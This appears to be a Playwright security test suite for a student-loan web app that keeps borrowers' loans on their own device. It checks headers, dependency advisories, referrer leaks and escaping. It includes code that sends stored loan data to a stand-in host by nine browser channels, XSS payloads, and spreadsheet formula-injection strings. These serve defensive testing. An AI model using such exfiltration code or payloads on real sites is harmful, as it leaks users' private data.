// Security and privacy: what keeps a borrower's saved loans on their device, the response headers behind the
// "Stays on this device" promise, and upkeep of the packages the site ships (SEC-01 to SEC-05 in ROADMAP.md).
// Requests to other sites are stopped inside the browser and recorded, and name lookups for any host but the
// app's fail inside Chromium, so nothing in this file reaches another host.
import {
  test as base, expect, knownIssue, openApp, goTo, KEYS, LOANS, PROFILE, SNAPSHOTS, HIDE_KEY,
} from './helpers.mjs';
import {
  hasRepo, repoHas, repoJson, repoFiles, readAll, CODE_FILE, NO_REPO, resolverRule, watchOffsite, frameFromOtherSite,
  compareVersions, nextLineStatus, productionCopies, unzip, xmlText, downloadBytes, linesMatching, xlsxReasonIn,
  NETWORK_CODE, OFF_SITE_URL, ANALYTICS_PACKAGE, FILE_READING,
} from './support/security-privacy.mjs';

const test = base.extend({
  launchOptions: [async ({ launchOptions }, use, workerInfo) => {
    const baseURL = workerInfo.project.use.baseURL ?? `http://localhost:${Number(process.env.AUDIT_PORT || 3100)}`;
    await use({ ...launchOptions, args: [...(launchOptions.args ?? []), resolverRule(baseURL)] });
  }, { scope: 'worker' }],
});

// A host that exists nowhere. Every request to it is stopped by watchOffsite before it is sent.
const COLLECTOR = 'loan-collector.invalid';
const STUB_PAGE = '<!doctype html><title>Another site</title><p>Another site</p>';
const APP_KEYS = [KEYS.loans, KEYS.profile, KEYS.snapshots, HIDE_KEY];
const list = items => items.join(', ');

/** Opens the Plans, Payoff and Records sections and back, so every section has rendered once. */
async function visitEverySection(page) {
  for (const tab of ['plans', 'payoff', 'records', 'loans']) await goTo(page, tab);
}

// ---------------------------------------------------------------------------------------------------------------
// Known issues
// ---------------------------------------------------------------------------------------------------------------

/**
 * Tries the nine ordinary ways a page can send data to another site, carrying the saved loans where the channel
 * has a body, and returns how many it tried. Each try ends on its own event or after a second at most. What left
 * is judged by what the browser actually requested (watchOffsite), not by anything the page reports.
 */
async function sendEverywhere({ base, key }) {
  const data = localStorage.getItem(key) ?? '';
  const q = `?bytes=${data.length}`;
  const settle = (start, ms = 1000) => new Promise(resolve => {
    const timer = setTimeout(() => resolve('no answer'), ms);
    const done = result => { clearTimeout(timer); resolve(result); };
    try { start(done); } catch (e) { done(`threw ${e.name}`); }
  });
  const element = (tag, props, events = ['load', 'error']) => settle(done => {
    const el = document.createElement(tag);
    for (const name of events) el.addEventListener(name, () => done(name));
    Object.assign(el, props);
    document.head.append(el);
  });
  const attempts = {
    fetch: () => fetch(`${base}/fetch${q}`, { method: 'POST', mode: 'no-cors', body: data })
      .then(() => 'answered', e => `failed: ${e.name}`),
    XMLHttpRequest: () => settle(done => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', `${base}/XMLHttpRequest${q}`);
      xhr.onloadend = () => done(`status ${xhr.status}`);
      xhr.send(data);
    }),
    // A beacon is fire-and-forget: wait for the refusal, or long enough for the request to be issued.
    sendBeacon: () => settle(done => {
      document.addEventListener('securitypolicyviolation', e => { if (e.blockedURI.includes('/sendBeacon')) done('refused'); });
      const queued = navigator.sendBeacon(`${base}/sendBeacon${q}`, data);
      setTimeout(() => done(queued ? 'queued' : 'not queued'), 500);
    }),
    EventSource: () => settle(done => {
      const source = new EventSource(`${base}/EventSource${q}`);
      source.onopen = () => { source.close(); done('open'); };
      source.onerror = () => { source.close(); done('error'); };
    }),
    WebSocket: () => settle(done => {
      const socket = new WebSocket(`${base.replace(/^https:/, 'wss:')}/WebSocket${q}`);
      socket.onopen = () => { socket.close(); done('open'); };
      socket.onerror = () => done('error');
      socket.onclose = () => done('closed');
    }),
    image: () => settle(done => {
      const img = new Image();
      img.onload = () => done('load');
      img.onerror = () => done('error');
      img.src = `${base}/image${q}`;
    }),
    stylesheet: () => element('link', { rel: 'stylesheet', href: `${base}/stylesheet${q}` }),
    script: () => element('script', { src: `${base}/script${q}` }),
    'form post': () => settle(done => {
      const sink = Object.assign(document.createElement('iframe'), { name: 'sec01-sink', hidden: true });
      document.body.append(sink);
      sink.addEventListener('load', () => done('navigated'));
      document.addEventListener('securitypolicyviolation', e => { if (e.blockedURI.includes('/form-post')) done('refused'); });
      const form = Object.assign(document.createElement('form'), { method: 'post', action: `${base}/form-post${q}`, target: 'sec01-sink' });
      form.append(Object.assign(document.createElement('input'), { type: 'hidden', name: 'loans', value: data }));
      document.body.append(form);
      form.submit();
    }),
  };
  await Promise.all(Object.values(attempts).map(run => run()));
  return Object.keys(attempts).length;
}

test("SEC-01 no page on this site can send a borrower's saved loans to another site", async ({ page, context, baseURL }) => {
  knownIssue('SEC-01');
  const appOrigin = new URL(baseURL).origin;
  const net = await watchOffsite(context, appOrigin);
  const firstDocument = page.waitForResponse(r => r.request().resourceType() === 'document');
  await openApp(page);
  const policy = (await (await firstDocument).allHeaders())['content-security-policy'] ?? 'none';

  // The app page itself, as if a later change or a dependency ran this code.
  const saved = (await page.evaluate(k => localStorage.getItem(k), KEYS.loans))?.length ?? 0;
  let tried = await page.evaluate(sendEverywhere, { base: `https://${COLLECTOR}/app`, key: KEYS.loans });

  // Every document on this origin can read the same storage, so each one must refuse too: the 404 page and the
  // icon can be opened in a window that the app's own code then drives.
  const PAGES = { app: '/', 'not-found': '/no-such-page', icon: '/icon.svg' };
  for (const label of ['not-found', 'icon']) {
    const other = await context.newPage();
    await other.goto(PAGES[label]);
    await other.evaluate(({ url, key }) => fetch(url, { method: 'POST', mode: 'no-cors', body: localStorage.getItem(key) ?? '' })
      .then(() => 'answered', e => `failed: ${e.name}`), { url: `https://${COLLECTOR}/${label}/fetch`, key: KEYS.loans });
    await other.close();
    tried++;
  }

  const left = [
    ...net.sent.filter(r => r.host === COLLECTOR).map(r => {
      const [, from, via] = new URL(r.url).pathname.split('/');
      return `${via.replace('-', ' ')} from ${PAGES[from]} (${r.bytes ? `${r.method}, ${r.bytes}-byte body` : r.method})`;
    }),
    ...net.sockets.filter(url => url.includes(COLLECTOR)).map(() => 'WebSocket from / (connection started)'),
  ];
  expect(left, `Nothing stops this site sending a borrower's saved loans (${saved} characters) elsewhere: ${left.length} of `
    + `${tried} attempts left for ${COLLECTOR}: ${list(left)}. Content-Security-Policy on /: ${policy}`).toEqual([]);
});

test('SEC-02 the site runs on a Next.js release line that still gets security fixes', async ({ page }) => {
  knownIssue('SEC-02');
  await openApp(page, { seeded: false });
  const served = await page.evaluate(() => window.next?.version ?? null);
  const installed = hasRepo() && repoHas('package-lock.json')
    ? repoJson('package-lock.json').packages?.['node_modules/next']?.version ?? null
    : null;
  const found = [
    served && { version: served, where: 'served (window.next.version on /)' },
    installed && { version: installed, where: 'installed (package-lock.json)' },
  ].filter(Boolean);
  test.skip(found.length === 0, 'Neither the page nor package-lock.json says which Next.js version runs the site');

  const stale = found.map(f => ({ ...f, ...nextLineStatus(f.version) })).filter(f => !f.supported);
  expect(stale.map(f => `${f.version} ${f.where}`),
    `Next.js ${list(stale.map(f => `${f.version} ${f.where}`))}: ${list([...new Set(stale.map(f => f.why))])} `
    + 'on nextjs.org/support-policy, so a future Next.js flaw would get no patch. Supported lines today: 16.x, or 15.x '
    + 'until 2027-01-31').toEqual([]);
});

test('SEC-03 another site cannot frame the app, and its responses refuse MIME sniffing, referrers and unused device features', async ({ page, context, baseURL }) => {
  knownIssue('SEC-03');
  const appOrigin = new URL(baseURL).origin;
  const net = await watchOffsite(context, appOrigin, { 'referrer-check.test': STUB_PAGE });
  const responses = [];
  page.on('response', r => { if (r.url().startsWith(appOrigin)) responses.push(r); });
  await openApp(page);
  const gaps = [];

  // Framing: a page on another site puts the app in an iframe.
  const attacker = await context.newPage();
  const framed = await frameFromOtherSite(attacker, `${appOrigin}/`);
  await framed.site.close();
  await attacker.close();
  const documentHeaders = await responses.find(r => r.request().resourceType() === 'document').allHeaders();
  if (framed.showsApp) {
    gaps.push(`a page on another site (${framed.site.url}) framed the app at ${framed.frameUrl} `
      + `(X-Frame-Options: ${documentHeaders['x-frame-options'] ?? 'none'}, CSP frame-ancestors: `
      + `${/frame-ancestors[^;]*/.exec(documentHeaders['content-security-policy'] ?? '')?.[0] ?? 'none'})`);
  }

  // MIME sniffing: the document, a script, a stylesheet and the icon must each say nosniff.
  const first = (match, label) => {
    const response = responses.find(r => match.test(r.url()));
    return response && { label, response };
  };
  const checked = [
    { label: '/', response: responses.find(r => r.request().resourceType() === 'document') },
    first(/\/_next\/static\/.+\.js(\?|$)/, 'a /_next/static script'),
    first(/\/_next\/static\/.+\.css(\?|$)/, 'a /_next/static stylesheet'),
  ].filter(Boolean);
  const icon = await page.request.get('/icon.svg');
  const sniffable = [];
  for (const { label, response } of checked) {
    if ((await response.allHeaders())['x-content-type-options']?.trim().toLowerCase() !== 'nosniff') sniffable.push(label);
  }
  if (icon.ok() && icon.headers()['x-content-type-options']?.trim().toLowerCase() !== 'nosniff') sniffable.push('/icon.svg');
  if (sniffable.length) gaps.push(`no X-Content-Type-Options: nosniff on ${list(sniffable)}`);

  // Referrer: a link added later without rel="noreferrer" must still not tell the next site where you came from.
  await page.evaluate(() => {
    const link = Object.assign(document.createElement('a'), {
      href: 'https://referrer-check.test/landing', target: '_blank', textContent: 'A link added later, without rel',
    });
    link.style.cssText = 'position:fixed;top:8px;left:8px;z-index:2147483647;background:#fff;padding:12px';
    document.body.append(link);
  });
  const [landing] = await Promise.all([
    context.waitForEvent('page'),
    page.getByRole('link', { name: 'A link added later, without rel' }).click(),
  ]);
  await landing.waitForLoadState('domcontentloaded');
  const visit = net.sent.find(r => r.host === 'referrer-check.test');
  const shownReferrer = await landing.evaluate(() => document.referrer).catch(() => '');
  await landing.close();
  if (visit?.referer || shownReferrer) {
    gaps.push(`a link without rel=noreferrer sent Referer: ${visit?.referer ?? shownReferrer} `
      + `(Referrer-Policy: ${documentHeaders['referrer-policy'] ?? 'none'})`);
  }

  // Device features the page never uses must be switched off for it and anything it embeds.
  const features = ['camera', 'microphone', 'geolocation'];
  const allowed = await page.evaluate(names => {
    const policy = document.featurePolicy ?? document.permissionsPolicy;
    return policy?.allowsFeature ? names.filter(n => policy.allowsFeature(n)) : null;
  }, features) ?? features.filter(f => !new RegExp(`(^|[,\\s])${f}=\\(\\)`).test(documentHeaders['permissions-policy'] ?? ''));
  if (allowed.length) gaps.push(`${list(allowed)} allowed (Permissions-Policy: ${documentHeaders['permissions-policy'] ?? 'none'})`);

  expect(gaps, `${gaps.length} of 4 baseline protections missing: ${gaps.join('; ')}`).toEqual([]);
});

test('SEC-04 the spreadsheet library can still be patched, or the repo records why xlsx 0.18.5 is safe and nothing reads a spreadsheet', async () => {
  knownIssue('SEC-04');
  test.skip(!hasRepo(), NO_REPO);
  const declared = repoJson('package.json').dependencies?.xlsx ?? null;
  let copies = repoHas('package-lock.json') ? productionCopies(repoJson('package-lock.json'), 'xlsx') : [];
  if (declared && copies.length === 0) {
    copies = [repoHas('node_modules/xlsx/package.json')
      ? { key: 'node_modules/xlsx', version: repoJson('node_modules/xlsx/package.json').version, resolved: '' }
      : { key: 'package.json', version: declared.replace(/^[^\d]*/, ''), resolved: '' }];
  }
  // GHSA-4r6h-8v6p-xvw6 is fixed in 0.19.3 and GHSA-5pgg-2g8v-p4x9 in 0.20.2. Either fix shape passes here:
  // xlsx removed (a small writer of its own) or every copy at 0.20.2 or later (the vendor's own tarball).
  const vulnerable = copies.filter(c => compareVersions(c.version, '0.20.2') < 0);
  if (vulnerable.length === 0) return;

  // The third shape: keep 0.18.5, with a recorded reason that stays true.
  const docs = readAll(['README.md', 'SECURITY.md', ...repoFiles('docs', /\.md$/i)]);
  const recordedIn = xlsxReasonIn(docs);
  const readers = linesMatching(readAll(repoFiles('src', CODE_FILE)), FILE_READING);

  const problems = [];
  if (!recordedIn.length) {
    problems.push(`no paragraph in ${list(Object.keys(docs))} records why xlsx stays (it should name the package and its advisories)`);
  }
  if (readers.length) problems.push(`src now reads files, so that reason would no longer hold: ${list(readers)}`);
  expect(problems, `xlsx ${list(vulnerable.map(c => `${c.version} (${c.key}, ${c.resolved || 'no resolved URL'})`))} `
    + `is below 0.19.3 and 0.20.2, the releases that fix GHSA-4r6h-8v6p-xvw6 and GHSA-5pgg-2g8v-p4x9, and ${problems.join('; ')}. `
    + `Lines in src that read a spreadsheet or a picked file: ${readers.length || 'none'}`).toEqual([]);
});

test('SEC-05 the production install has no copy of postcss or source-map-js inside their advisory ranges', async () => {
  knownIssue('SEC-05');
  test.skip(!hasRepo(), NO_REPO);
  test.skip(!repoHas('package-lock.json'), 'The repo has no package-lock.json to read');
  const lock = repoJson('package-lock.json');
  // postcss <= 8.5.22: GHSA-qx2v-qp2m-jg93, GHSA-6g55-p6wh-862q, GHSA-fxqj-rqcc-2cmp, GHSA-r28c-9q8g-f849.
  // source-map-js < 1.2.2: GHSA-68fv-2mgg-jv7q.
  const flagged = [
    ...productionCopies(lock, 'postcss').filter(c => compareVersions(c.version, '8.5.22') <= 0)
      .map(c => `${c.key} ${c.version} (needs above 8.5.22)`),
    ...productionCopies(lock, 'source-map-js').filter(c => compareVersions(c.version, '1.2.2') < 0)
      .map(c => `${c.key} ${c.version} (needs 1.2.2 or later)`),
  ];
  expect(flagged, `package-lock.json installs ${flagged.length} production copies inside advisory ranges, which keep `
    + `npm audit --omit=dev red for build-time code: ${list(flagged)}`).toEqual([]);
});

// ---------------------------------------------------------------------------------------------------------------
// Regression guards: what the audit verified is right today
// ---------------------------------------------------------------------------------------------------------------

test("a borrower's whole visit, both downloads included, sends nothing to another site and keeps nothing beyond its own storage keys", async ({ page, context, baseURL }) => {
  const appOrigin = new URL(baseURL).origin;
  const net = await watchOffsite(context, appOrigin);
  const sentHome = [];
  const errors = [];
  page.on('request', r => { if (r.method() !== 'GET' && r.url().startsWith(appOrigin)) sentHome.push(`${r.method()} ${r.url()}`); });
  page.on('console', m => { if (m.type() === 'error') errors.push(m.text().slice(0, 160)); });
  page.on('pageerror', e => errors.push(String(e).slice(0, 160)));
  await openApp(page);

  const download = async () => {
    const [file] = await Promise.all([
      page.waitForEvent('download'),
      page.getByRole('button', { name: 'Download as a spreadsheet' }).click(),
    ]);
    return { name: file.suggestedFilename(), parts: unzip(await downloadBytes(file)) };
  };
  const loansFile = await download();
  await goTo(page, 'plans');
  await page.getByRole('button', { name: /^Use .+ as my plan$/ }).first().click();
  await goTo(page, 'payoff');
  await page.getByRole('group', { name: 'Common amounts' }).getByRole('button', { name: '$200' }).click();
  await goTo(page, 'records');
  await page.getByRole('button', { name: "Save today's snapshot" }).click();
  const historyFile = await download();
  await goTo(page, 'loans');

  const kept = await page.evaluate(async () => ({
    local: Object.keys(localStorage),
    session: Object.keys(sessionStorage).filter(k => k !== 'audit.seeded'),
    indexedDB: indexedDB.databases ? (await indexedDB.databases()).map(d => d.name) : [],
    serviceWorkers: navigator.serviceWorker ? (await navigator.serviceWorker.getRegistrations()).length : 0,
    caches: globalThis.caches ? await caches.keys() : [],
  }));
  const cookies = (await context.cookies()).map(c => c.name);
  const sheets = file => [...xmlText(file.parts['xl/workbook.xml'] ?? Buffer.from('')).matchAll(/<sheet [^>]*name="([^"]+)"/g)].map(m => m[1]);

  const problems = [
    ...net.sent.map(r => `${r.method} ${r.url} left for another site`),
    ...net.sockets.map(url => `a WebSocket opened to ${url}`),
    ...sentHome.map(r => `${r} sent data to the app's own server`),
    ...cookies.map(name => `cookie ${name} set`),
    ...kept.local.filter(k => !APP_KEYS.includes(k)).map(k => `localStorage key ${k} is not one of the app's`),
    ...kept.session.map(k => `sessionStorage key ${k}`),
    ...kept.indexedDB.map(name => `IndexedDB database ${name}`),
    ...(kept.serviceWorkers ? [`${kept.serviceWorkers} service worker(s) registered`] : []),
    ...kept.caches.map(name => `Cache Storage ${name}`),
    ...errors.map(e => `console error: ${e}`),
    ...(sheets(loansFile).includes('My loans') ? [] : [`${loansFile.name} has sheets [${sheets(loansFile)}], not "My loans"`]),
    ...(sheets(historyFile).length === 3 ? [] : [`${historyFile.name} has sheets [${sheets(historyFile)}], expected 3`]),
  ];
  expect(problems, `The visit was not private: ${problems.join('; ')}`).toEqual([]);
});

test('links to other sites give the next site no referrer and no handle back to the app', async ({ page, context, baseURL }) => {
  const appOrigin = new URL(baseURL).origin;
  const net = await watchOffsite(context, appOrigin, { '*': STUB_PAGE });
  const tested = new Map();

  // Each distinct external anchor once: two anchors with identical markup behave identically.
  async function clickExternalLinks(where) {
    const anchors = page.getByRole('link');
    for (let i = 0; i < await anchors.count(); i++) {
      const link = anchors.nth(i);
      const { href, html, visible, newTab } = await link.evaluate(a => ({
        href: a.href, html: a.outerHTML, visible: a.checkVisibility(), newTab: a.target === '_blank',
      }));
      if (!visible || !/^https?:/.test(href) || new URL(href).origin === appOrigin || tested.has(html)) continue;
      const before = net.sent.length;
      let seen = { referrer: '', opener: false };
      if (newTab) {
        const [landing] = await Promise.all([context.waitForEvent('page'), link.click()]);
        await landing.waitForLoadState('domcontentloaded');
        seen = await landing.evaluate(() => ({ referrer: document.referrer, opener: window.opener !== null }));
        await landing.close();
      } else {
        // A link that leaves in the same tab has no opener to hand over, but can still send a referrer.
        await link.click();
        await page.waitForURL(url => !url.href.startsWith(appOrigin));
        seen.referrer = await page.evaluate(() => document.referrer);
        await page.goBack();
        await page.locator('#main').waitFor();
      }
      const request = net.sent.slice(before).find(r => r.type === 'document');
      tested.set(html, { where, href, referer: request?.referer ?? null, ...seen });
    }
  }

  await openApp(page, { seeded: false });
  await clickExternalLinks('first run');
  await page.getByRole('button', { name: 'Add my first loan' }).click();
  await clickExternalLinks('loan form');

  await page.goto('about:blank');
  await openApp(page);
  for (const tab of ['plans', 'payoff', 'records', 'loans']) {
    await goTo(page, tab);
    await clickExternalLinks(tab);
  }

  const results = [...tested.values()];
  const leaks = results.filter(r => r.referer || r.referrer || r.opener)
    .map(r => `${r.href} (${r.where}): Referer ${r.referer ?? 'none'}, document.referrer "${r.referrer}", opener ${r.opener}`);
  expect(results.length, 'external links found and clicked').toBeGreaterThan(0);
  expect(leaks, `Links leak where the borrower came from: ${leaks.join('; ')}`).toEqual([]);
});

const RAN = 'window.markupRan = (window.markupRan || 0) + 1';
const MARKUP = [
  `<img src="sec-markup-img" onerror="${RAN}">`,
  `<script>${RAN}</script>`,
  `<svg onload="${RAN}"></svg>`,
  `"><iframe src="javascript:parent.markupRan = (parent.markupRan || 0) + 1"></iframe>`,
];

/** Adds one loan through the real form, with only the fields a borrower must fill plus a name. */
async function addLoanNamed(page, name) {
  await page.getByRole('button', { name: 'Add a loan', exact: true }).click();
  await page.getByRole('button', { name: '2024–25', exact: true }).click();
  await page.getByRole('textbox', { name: /^What you owe on it today/ }).fill('1250');
  await page.getByRole('button', { name: 'Add more detail' }).click();
  await page.getByRole('textbox', { name: /^Name/ }).fill(name);
  await page.getByRole('button', { name: 'Save loan', exact: true }).click();
  await expect(page.getByRole('status').filter({ hasText: 'Saved' })).toContainText(`Saved ${name}`);
}

test('markup in loan names and servicers shows as text and never runs', async ({ page }) => {
  const hostile = LOANS.map((loan, i) => (i < MARKUP.length
    ? { ...loan, nickname: MARKUP[i], servicer: MARKUP[(i + 1) % MARKUP.length] } : loan));
  const moved = hostile.map((loan, i) => (i < MARKUP.length ? { ...loan, balance: loan.balance + 25 } : loan));
  const snapshots = [
    { takenAt: SNAPSHOTS[0].takenAt, loans: hostile, totalBalance: hostile.reduce((s, l) => s + l.balance, 0) },
    { takenAt: SNAPSHOTS[1].takenAt, loans: moved, totalBalance: moved.reduce((s, l) => s + l.balance, 0) },
  ];
  const dialogs = [];
  const markupRequests = [];
  page.on('dialog', d => { dialogs.push(d.message()); d.dismiss().catch(() => {}); });
  page.on('request', r => { if (/sec-(markup|typed)-img/.test(r.url())) markupRequests.push(r.url()); });
  await openApp(page, { loans: moved, snapshots, profile: PROFILE });

  // Every place a name or servicer is shown: each loan row opened (its name leads the row's label), every
  // section, and the snapshot diff on Records.
  const row = name => page.getByRole('button', { name: new RegExp(`^${name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`) });
  for (const markup of MARKUP) await row(markup).click();
  await visitEverySection(page);

  // And typed through the real form, the way a borrower would.
  const typed = `<img src="sec-typed-img" onerror="${RAN}">`;
  await addLoanNamed(page, typed);
  await row(typed).click();

  const seen = await page.evaluate(() => ({
    ran: window.markupRan ?? 0,
    injected: document.querySelectorAll('img[src*="sec-"], svg[onload], iframe[src^="javascript"]').length,
    text: document.body.innerText,
  }));
  const problems = [
    ...(seen.ran ? [`markup ran ${seen.ran} time(s)`] : []),
    ...(seen.injected ? [`${seen.injected} element(s) built from loan text`] : []),
    ...dialogs.map(d => `dialog: ${d}`),
    ...markupRequests.map(u => `an element built from loan text requested ${u}`),
    ...(seen.text.includes(typed) ? [] : ['the typed name is not shown as text']),
  ];
  expect(problems, `Loan text was treated as markup: ${problems.join('; ')}`).toEqual([]);
});

test('names that look like spreadsheet formulas export as plain text, never as formulas', async ({ page }) => {
  const formulas = ['=HYPERLINK("https://loan-collector.invalid/","Open")', '+1+1', '-2+3', '@SUM(1,1)'];
  const loans = LOANS.map((loan, i) => (i < formulas.length ? { ...loan, nickname: formulas[i] } : loan));
  await openApp(page, { loans, snapshots: null });

  // One more typed through the form.
  const typed = '=1+2';
  await addLoanNamed(page, typed);

  const [file] = await Promise.all([
    page.waitForEvent('download'),
    page.getByRole('button', { name: 'Download as a spreadsheet' }).click(),
  ]);
  const parts = unzip(await downloadBytes(file));
  const sheets = Object.keys(parts).filter(name => /^xl\/worksheets\/.+\.xml$/.test(name));
  const formulaCells = sheets.flatMap(name => (xmlText(parts[name]).match(/<f[\s>][^<]*/g) ?? []).map(f => `${name}: ${f}`));
  const allText = Object.entries(parts).filter(([name]) => name.endsWith('.xml')).map(([, b]) => xmlText(b)).join('\n');
  const missing = [...formulas, typed].filter(f => !allText.includes(f));
  expect(sheets.length, `${file.suggestedFilename()} holds worksheets`).toBeGreaterThan(0);
  expect([...formulaCells, ...missing.map(f => `"${f}" not stored as text`)],
    `Loan names became formulas in ${file.suggestedFilename()}`).toEqual([]);
});

test('the source has no network call, tracker or off-site address, and no analytics package', async () => {
  test.skip(!hasRepo(), NO_REPO);
  // The shapes a sending line or an analytics snippet takes, and addresses beyond the two sites the app links to.
  const source = readAll(repoFiles('src', CODE_FILE));
  const found = [
    ...linesMatching(source, NETWORK_CODE, OFF_SITE_URL),
    ...Object.keys(repoJson('package.json').dependencies ?? {}).filter(name => ANALYTICS_PACKAGE.test(name))
      .map(name => `package.json dependency ${name}`),
  ];
  expect(Object.keys(source).length, 'source files scanned').toBeGreaterThan(0);
  expect(found, `The "Stays on this device" promise has new code to check: ${list(found)}`).toEqual([]);
});
